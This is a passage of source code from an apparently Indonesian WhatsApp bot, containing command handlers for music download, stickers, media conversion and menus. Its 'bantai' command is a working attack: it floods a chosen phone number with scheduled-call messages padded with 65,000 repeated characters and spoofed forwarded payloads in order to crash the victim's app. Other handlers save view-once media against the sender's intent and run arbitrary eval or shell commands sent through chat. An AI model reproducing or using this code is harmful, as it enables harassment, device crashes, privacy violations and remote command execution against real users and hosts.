 const albumName = $('td:contains("Album:")').next().text();
 const duration = $('td:contains("Duration:")').next().text();
 const artist = $('td:contains("Artist:")').next().text();
 const thumb = $('figure.image img').attr('src');
 const urlMusic = urls;
 const token = $('a#download_btn').attr('token');
 const downloadLink = await appledown.getAudio(trackName, artist, urlMusic, token);

 const extractedData = {
 name: trackName,
 albumname: albumName,
 artist: artist,
 url: urlMusic,
 thumb: thumb,
 duration: duration,
 token: token,
 download: downloadLink
 };
 return extractedData;
 } catch (error) {
 return { success: false, message: error.message };
 console.error("Error:", error.response ? error.response.data : error.message); 
 }
 }
 }
}

if (!text) return reply("nama lagu nya?")
const hasil = await appleMusic.search(text)
let audioap = await appledown.download(hasil[0].link)

let applecap = `╭──── *[ ᴀᴘᴘʟᴇᴍᴜsɪᴄ - ᴅʟ ]* ──々
│ =〆 ɴᴀᴍᴇ : ${audioap.name}
│ =〆 ᴀʟʙᴜᴍ : ${audioap.albumname}
│ =〆 ᴅᴜʀᴀᴛɪᴏɴ : ${audioap.duration}
│ =〆 ᴜʀʟ : ${audioap.url}
╰─々
`;

await ptz.sendMessage(m.chat, {
text: applecap, 
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: audioap.name,
 mediaType: 1,
 previewType: 1,
 body: audioap.albumname,
 //previewType: "PHOTO",
 thumbnailUrl: audioap.thumb,
 renderLargerThumbnail: true,
 mediaUrl: audioap.url,
 sourceUrl: audioap.url
 }
 }
}, { quoted: m })

await ptz.sendMessage(m.chat, {
audio: {
url: audioap.download
},
mimetype: 'audio/mpeg',
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: audioap.name,
 mediaType: 1,
 previewType: 1,
 body: audioap.albumname,
 //previewType: "PHOTO",
 thumbnailUrl: audioap.thumb,
 renderLargerThumbnail: false,
 mediaUrl: audioap.url,
 sourceUrl: audioap.url
 }
 }
}, { quoted: m })
}
break

case 'liston': case 'listonline': {
if (!m.isGroup) return reply('Khusus Untuk Group')
let online = [...Object.keys(store.presences[id]), botNumber]
ptz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break

case 'cleartmp': {
const { readdirSync, statSync, unlinkSync } = require('fs');
const { join } = require('path');

const tmp = ['./tmp'];
 const filenames = [];

 tmp.forEach(dirname => {
 readdirSync(dirname).forEach(file => {
 filenames.push(join(dirname, file));
 });
 });

 const deletedFiles = [];

 filenames.forEach(file => {
 const stats = statSync(file);

 if (stats.isDirectory()) {
 console.log(`Skipping directory: ${file}`);
 } else {
 unlinkSync(file);
 deletedFiles.push(file);
 }
 });

 reply('Success!');

 if (deletedFiles.length > 0) {
 console.log('Deleted files:', deletedFiles);
 reply(`Deleted files:\n${deletedFiles.join('\n')}`);
 }

 if (deletedFiles.length == 0) {
 reply('tidak ada file yang tersisa di tmp');
 }
}
 break

case 'rvo2': {
if (!m.quoted) return reply(`Please reply to viewonce's message`) 
 if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('That\'s not viewonce message.') 
 let msg = m.quoted.message
 let type = Object.keys(msg)[0]
 let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
 let buffer = Buffer.from([])
 for await (const chunk of media) {
 buffer = Buffer.concat([buffer, chunk])
 }
 if (/video/.test(type)) {
 return ptz.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
 } else if (/image/.test(type)) {
 return ptz.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
 }
}
break

case "cadmin": {
if (!isPrem) return reply("FITUR KHUSUS OWNER");
let username = text.toLowerCase()
let email = username+"@admin.com"
let name = (args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await reply("*Berhasil Membuat Akun Admin Panel ✅*")
} else {
orang = m.chat
}
var teks = `
*Succes Create Admin Panel*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Link Login :* ${global.domain}

`
ptz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {title: `DATA ADMIN PANEL ANDA`,body: `HARAP SIMPAN DENGAN BAIK`, previewType: "PHOTO",thumbnailUrl: fkethmb,thumbnail: '',sourceUrl: `${global.domain}`}}}, { quoted:m})}
break

case 'reminder': {
 if (!args[0] || !args[1] || !args[2]) return reply('*contoh : Reminder Waktu Detik/Menit/Jam Pesan*\n\n*Contoh : Reminder 30 Menit Jangan Lupa Sholat*')
 const time = parseInt(args[0]) * (args[1].match(/(m|minute)/i) ? 60 : args[1].match(/(h|hour)/i) ? 3600 : 1) * 1000
 const message = args.slice(2).join(' ')
 setTimeout(() => {
 ptz.sendMessage(m.chat, { text: `*Reminder Untuk @${m.sender.split("@")[0]}*\n\n *Dengan Pesan :* ${message}`, contextInfo: { mentionedJid: [sender] } }, { quoted: m })
 }, time)
 reply(`*Berhasil Mengatur Reminder Untuk ${args[0]} ${args[1]} Ke Depan*`)
 }
 break

case 'brat':{
if (!text) return reply(`Masukan Teks\n\nexample ${prefix + command} alok hamil`)
let rulz = `https://mannoffc-x.hf.space/brat?q=${text}`
try {
ptz.sendImageAsSticker(m.chat, rulz, m, { packname: `${botname}`, author: `${ownername}`})
 await sleep(2000)
let repl = `_Tunggu sebentar_`
reply(repl)
await sleep(1000)
 /*ptz.sendMessage(m.chat, { image: {url: rulz}, caption: `Done`}, { quoted: m })*/
} catch (e) {
 console.log(e);
 await reply(`Terjadi eror`)
 }
}
break

case 'unbanchat': {
if (!text) return reply('Masukkan user/id group yang ingin di unban\n\nExample: .unban 6282361160044 atau .ban 73647438@g.us')
 let who
 if (m.isGroup) {
 if (isPrem) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat
 else who = m.chat
 } else {
 if (!isPrem) {
 /*global.mess.wait('owner', m, ptz)
 throw false*/
	 return
 }
 who = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.chat
 }

 try {
 if (text.endsWith('g.us')) global.db.data.chats[text].isBanned = false
 else global.db.data.users[who].banned = false
 m.reply(`Berhasil unban! ${await ptz.user.id} aktif dichat ${await ptz.getName(who) == undefined ? 'ini' : await ptz.getName(who)}.`)
 } catch (e) {
 reply(`nomor tidak ada didatabase!`)
 }
}
break

case 'banchat': {
global.db.data.chats[m.chat].isBanned = true
 reply('Berhasil membanned chat, Bot tidak akan respon di chat ini.')
}
break

case 'aiw': {
if (!text) return reply(`☘️ *Mau Nanya Apa Sama Ai4Chat?*`)
if (text.length > 500) return lenwyreply(`☘️ *Maksimal 500 Karakter*`)
reply('☘️ *Sabar Yaa*')
var lenwyai = await fetchJson(`https://rest-api-free.vercel.app/blackboxai?text=${text}`)
var lenai = lenwyai.data
await reply(lenai)
}
break

case 'toimage': case 'toimg': {
//if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${prefix + command}*`)
let media = await ptz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
//await loading()
let media = await ptz.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
ptz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${ownername}.mp3`}, { quoted : m })
}
break
//=================================================//
case 'toaudio': case 'audio': {
//if (isBan) return reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
if (!quoted) return reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
//await loading()
let media = await ptz.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
ptz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn': case 'voice': {
//if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
if (!quoted) return reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
ptz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{ externalAdReply: { showAdAttribution: true,
mediaType: 1,
mediaUrl: 'https://wa.me/6285730672259',
title: `${ownername}`,
sourceUrl: `https://wa.me/6285730672259`, 
thumbnail: fkethmb 
}
}})
}
break
//=================================================//
case 'togif': case 'tomp4': case 'tovideo':{
//if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`*reply sticker with caption* *${prefix + command}*`)
//await loading()
 let { webp2mp4File } = require('./lib/uploader')
let media = await ptz.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await ptz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
//=================================================//

case 'x': 
const messa = await prepareWAMessageMedia({ image: { url: 'https://b.top4top.io/p_3241969c11.jpg'}}, { upload: ptz.waUploadToServer })
const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage, 
"productId": "",
"title": `Welcome @${m.sender.split("@")[0]}`,
"description": `SCRIPT BOT WHATSAPP MULTIDEVICE`,
"currencyCode": "IDR",
"message": "YutaGz - LeooxzyGz - DekuGz", 
"bodyText": `Deku`,
"footerText": `Deku`,
"priceAmount1000": "20000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "80000",
"retailerId": `Deku`,
"url": "wa.me/6282172589188"
},
"businessOwnerJid": "15122377700@s.whatsapp.net",
"contextInfo": {isForwarded: true, mentionedJid: [m.sender]}
},
}), { userJid: m.chat, quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: 'Welcome By Yuta Fungsi By Celci' }}}) 

ptz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
break

case 'listcase':{
const listcase = () => {
 const code = fs.readFileSync("./message.js", "utf8");
 const regex = /case\s+'([^']+)':/g;
 const matches = [];
 let match;

 while ((match = regex.exec(code))) {
 matches.push(match[1]);
 }

 let teks = `*Total Case*📑: ${matches.length} \n\n`;
 matches.forEach(x => {
 teks += " ◦ " + x + "\n";
 });

 return teks;
 };
 let result = await listcase()
 reply(result)
}
break

case "twt2": {
if (!text) return reply("Masukan teksnya!")
try {
 ppser = await ptz.profilePictureUrl(m.sender, 'image');
} catch (e) {
 ppser = 'https://telegra.ph/file/68d47ac90bcc8ef1510fa.jpg';
}
let { data } = await axios.post('https://ruloaooa-swgen.hf.space/generate2', {
 avatar: ppser,
 username: pushname,
 text: text,
 countLike: (Math.floor(Math.random() * 10000))
}, { responseType: 'arraybuffer' })
ptz.sendMessage(m.chat, { image: data })
}
break
case 'addcase': {
if (!isPrem) return reply(mess.owner)
if (!text) return reply('Mana case nya');
const fs = require('fs');
const namaFile = 'message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}
const posisiAwalGimage = data.indexOf("case 'addcase':");

if (posisiAwalGimage !== -1) {
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
reply('Terjadi kesalahan saat menulis file:', err);
} else {
reply('Case baru berhasil ditambahkan.');
}
});
} else {
reply('Tidak dapat menambahkan case dalam file.');
}
});
}
break
case 'getcase':
if (!isPrem) return reply('Fitur ini cuman buat Owner bot!')
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("message.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCase(text)}`)
break
case "bantai":
if (!isPrem) return reply('Khusud Prem Yang Mau Buy Prem Ke Owner')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895392249321`)
Pscajae = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
        for (let jumbo = 0; jumbo < 10; jumbo++) {
          const asu = '' + 'ྃ'.repeat(65000);
          const jancok = "🔥 ALBYS🔥" + asu;
          const memek = {
            scheduledTimestampMs: 2000,
            callType: "VOICE",
            title: jancok
          };
          const kontol = {
            scheduledCallCreationMessage: memek
          };
          ptz.relayMessage(Pscajae, kontol, {
            'participant': {
              'jid': m.chat
            }
          });
          await sleep(200);
          const bajing = {
            text: "ALBYS"
          };
          const wasu = {
            ephemeralExpiration: WA_DEFAULT_EPHEMERAL
          };
          ptz.sendMessage(Pscajae, bajing, wasu);
          await sleep(200);
          const mekih = {
            text: "ASSALAMUALAIKUM 😈"
          };
          const ahco = {
            ephemeralExpiration: WA_DEFAULT_EPHEMERAL
          };
          ptz.sendMessage(Pscajae, mekih, ahco);
          await sleep(200);
          const babuk = {
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {},
            isForwarded: true,
            forwardedNewsletterMessageInfo: {}
          };
          babuk.quotedMessage.listResponseMessage = {};
          babuk.quotedMessage.listResponseMessage.title = "WE ARE DEVELOPER ALBYS";
          babuk.forwardedNewsletterMessageInfo.newsletterJid = "120363291649906185@newsletter";
          babuk.forwardedNewsletterMessageInfo.newsletterName = "ALBYS";
          babuk.forwardedNewsletterMessageInfo.serverMessageId = 0x1;
          babuk.forwardedNewsletterMessageInfo.low = "1708726663";
          babuk.forwardedNewsletterMessageInfo.high = '0';
          babuk.forwardedNewsletterMessageInfo.unsigned = "true";
          babuk.forwardedNewsletterMessageInfo.initiator = '0';
          babuk.forwardedNewsletterMessageInfo.trigger = '0';
          const alawik = {
            text: "I AM ALBYS",
            contextInfo: babuk
          };
          const konstol = {
            extendedTextMessage: alawik
          };
          ptz.relayMessage(Pscajae, konstol, {
            'participant': {
              'jid': m.chat
            }
          });
        }
        break;

case 'beton': case 'menu': case 'simplemenu': case 'menulist': case 'menumon':
 //if (global.setmenu === "v1") {
let pedo = "`";
let tektekk = 'test';
let teksskkk = `${tektekk}`;
let sections = [/*{
		title: 'All simple Menu Bot', 
		rows: [{
	    title: 'A-I Menu List',
    	description: `<!> Display All Openai Feature •`, 
    	id: `${prefix}openaimon`
        },  */
	{
        title: 'ALL MENU AYANO',
        highlight_label: '🔎 MELIHAT SEMUA LIST MENU AYANO',
        rows: [
            {
                header: 'AYANO',
                title: 'MENU ALL',
                description: '🌟 MEMILIH UNTUK DAPAT MENEMUKAN LEBIH BANYAK MENU',
                id: '.menuall',
                },
            ],
        },
/*{
                   title: 'Voice Menu List',
                   description: "<!> Display All Voice Feature",
                   id: `${prefix}voicemon`
                   },*/
               /*{
                   title: 'Rpg Menu List',
                   description: "<!> Display All Rpg Feature",
                   id: `${prefix}rpgmon`
                   },
               {
                   title: 'Pushkontak Menu List',
                   description: "<!> Display All push Feature",
                   id: `${prefix}pushkontakmon`
                   },
               {
                   title: 'Group Menu List',
                   description: "<!> Display All Group Feature",
                   id: `${prefix}groupmon`
                   },
               {
                   title: 'Main Menu List',
                   description: "<!> Display All Main Feature",
                   id: `${prefix}mainmon`
                   },
               {
                   title: 'Tools Menu List',
                   description: "<!> Display All Tools Feature",
                   id: `${prefix}toolsmon`
                   },
               {
                   title: 'Ddos Menu List',
                   description: "<!> Display All Ddos Feature",
                   id: `${prefix}ddosmon`
                   },
               {
                   title: 'Photooxy Menu List',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'Ephoto Menu List',
                   description: "<!> Display All Ephoto Feature",
                   id: `${prefix}ephotomon`
                   },
               {
                   title: 'Sticker Menu List',
                   description: "<!> Display All Sticker Feature",
                   id: `${prefix}stickermon`
                   },
               {
                   title: 'Temporary Menu List',
                   description: "<!> Display All Temporary Feature",
                   id: `${prefix}tempormon`
                   },  
               {
                   title: 'Menu List',
                   description: "<!> Display All Simple Menu",
                   id: `${prefix}menumon`
                   },  
               {
                   title: 'Create Panel Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}panelmon`
                   },
               {
                   title: 'Digital Ocean List',
                   description: "<!> Display All D-o Feature",
                   id: `${prefix}domon`
                   },
               {
                   title: 'Linode Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}linodemon`
                   },
               {
                   title: 'All Menu List',
                   description: "<!> Display All Menu List",
                   id: `${prefix}allmon`
                   },  
               {
                   title: 'Photooxy Maker Menu List',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'Ephoto Maker Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}ephotomon`
                   },                   
               {
                   title: 'Jadibot Menu List',
                   description: "<!> Display All Jadibot Feature",
                   id: `${prefix}jadibotmon`
                   },
               {
                   title: 'Absen gc Menu List',
                   description: "<!> Display All Absen Feature",
                   id: `${prefix}absenmon`
                   },    
               {
                   title: 'Berita Menu List',
                   description: "<!> Display All Berita Feature",
                   id: `${prefix}beritamon`
                   },*/
			   {
        title: 'MENU DOWNLOAD',
        highlight_label: '🔎 MENEMUKAN LEBIH BANYAK MENU UNTUK MENDOWNLOAD',
        rows: [
            {
                header: 'DOWNLOAD MENU',
                title: 'AYANO DOWNLOAD MENU',
                description: '🌟 LEBIH BANYAK MENU UNTUK MENDOWNLOAD',
                id: '.menudownload',
                },
            ],
        },
	{
		title: 'All simple Menu Bot', 
		rows: [{
	    title: 'A-I Menu List',
    	description: `<!> Display All Openai Feature •`, 
    	id: `${prefix}openaimon`
        },
{
		title: 'Owner Menu List', 
		description: "<!> Display All Owner Feature •", 
		id: `${prefix}ownermon`
	    }]
}]

let listMessage = {
    title: 'List Menu Veemon',
    sections
};

let msghhhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m?.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '12036326753195844@newsletter',
                        newsletterName: `${global.botname} • ${runtime(process.uptime())}`,
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: ptz.decodeJid(ptz.user.id)
                    },
                    externalAdReply: {
                        title: global.title,
                        body: global.body,
                        thumbnail: fs.readFileSync("./Dich.png"),
                        sourceUrl: global.saluran,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teksskkk
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `© uyy`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ``,
                    thumbnailUrl: "",
                    gifPlayback: true,
                    subtitle: "Multi Device",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        document: fs.readFileSync('./package.json'),
                        mimetype: "image/jpeg",
                        jpegThumbnail:fs.readFileSync("./Dich.png"),
fileName: global.botname,
                     }, {
                        upload: ptz.waUploadToServer
                    }))
                }),
                gifPlayback: true,
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                        "name": "single_select",
                        "buttonParamsJson": JSON.stringify(listMessage)
                    }]
                })
            })
        }
    }
}, {
    quoted: m
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhh.key.remoteJid, msghhhhhhhhhhhhhhhhhhh.message, {
    messageId: msghhhhhhhhhhhhhhhhhhh.key.id
});
     break
	 case 'lumina':
 if (args.length < 1) return 
 if (text == 'on') {
 global.db.data.chats[m.chat].ai = true
 m.reply('Sukses mengaktifkan chat ai')
 } else if (text == 'off') {
 global.db.data.chats[m.chat].ai = false
 m.reply('Sukes menonaktifkan chat ai')
 } else {
 //m.reply('Agak Laen')
 }
 break
default:
if (!m.fromMe & global.db.data.chats[m.chat].ai && body != undefined) {   
let chats = await luminai(body, `namamu adalah jizyy, ubah sifatmu seorang wanita yang pintar dan lucu, gunakan salah satu dari "(⁠人⁠ ⁠•͈⁠ᴗ⁠•͈⁠), (⁠◡⁠ ⁠ω⁠ ⁠◡⁠), (⁠ ⁠ꈍ⁠ᴗ⁠ꈍ⁠)" untuk menyampa user, dan gunakan salah satu ekspresi ini "(⁠ ⁠･ั⁠﹏⁠･ั⁠), (⁠｡⁠•́⁠︿⁠•̀⁠｡⁠), (⁠’⁠;⁠︵⁠;⁠’)" untuk sedih, dan gunakan salah satu ekspresi ini "(⁠ᗒ⁠ᗩ⁠ᗕ⁠), (⁠ ⁠≧⁠Д⁠≦⁠), .⁠·⁠’⁠¯⁠'⁠(⁠>⁠▂⁠<⁠)⁠'⁠¯⁠‘⁠·⁠." ketika menangis dan gunakan ${pushname} untuk menyebutkan nama user`, `${pushname}`)
//await sleep(5000)
let puqi = chats.result
m.reply(puqi)
}

if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m?.reply(bang)
}
try {
m?.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m?.reply(String(e))
}
}
//ni eval lama gue nonaktifin
/*if (budy.startsWith('>')) {
if (!isPrem) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${text}})()`)
} catch (e) {
teks = e
} finally {
await m?.reply(require('util').format(teks))
}
}*/

if (budy.startsWith('>')) {
                    if (!isPrem) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                    }
                }

				if (budy.startsWith('<')) {
if (!isPrem) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(util.format(err))
}}
    
if (body.startsWith("nn")) {
        if (!text) return m.reply('codenya mana kak')
        syntaxerror = require('syntax-error')
        _syntax = ''
        _text = args.join(' ')
        try {
          evalll = await eval(`;(async () => { return ${args.join(' ')} })()`)
          m.reply(require('util').format(evalll))
        } catch (e) {
          let err = await syntaxerror(_text, 'Execution Function', {
            allowReturnOutsideFunction: true,
            allowAwaitOutsideFunction: true
          })
          if (err) _syntax = '```' + err + '```\n\n'
          _return = e
          await m.reply(_syntax + require('util').format(_return))
        }
      }

if (budy.startsWith('$')) {
if (!isPrem) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m?.reply(`${err}`)
m.reply('```Dichxploit Special Feature..```')
if (stdout) return m?.reply(stdout)
})
}

if ((m?.mtype === 'groupInviteMessage' || m?.text.startsWith('Undangan untuk bergabung') || m?.text.startsWith('Invitation to join') || m?.text.startsWith('Buka tautan ini')) && !m?.isBaileys && !m?.isGroup) {
await ptz.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'group apa itu'
m?.reply(teks)
}
	
if (!m?.fromMe & !m?.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; 
let caption = `Hᴀʟᴏ @${m?.sender.split('@')[0]} ${ucapanWaktu}, ᴀᴅᴀ ᴀᴘᴀ ᴄʜᴀᴛ *Sɪᴘᴜᴛᴢx*, Jɪᴋᴀ ᴘᴇɴᴛɪɴɢ ᴛɪɴɢɢᴀʟᴋᴀɴ ᴄʜᴀᴛ ᴅᴀɴ *Sɪᴘᴜᴛᴢx* ᴀᴋᴀɴ ᴍᴇᴍʙᴀʟᴀꜱ ꜱᴇᴄᴇᴘᴀᴛ ᴍᴜɴɢᴋɪɴ.`.trim();
ptz.sendMessage(m?.chat,{text:caption,mentions:[m?.sender]},{quoted:m})
user.pc = new Date() * 1;
}
}
} catch (err) {
//ptz.sendMessage('6287826292008@s.whatsapp.net', { text: util.format(err) })
    console.log(err)
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(color(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
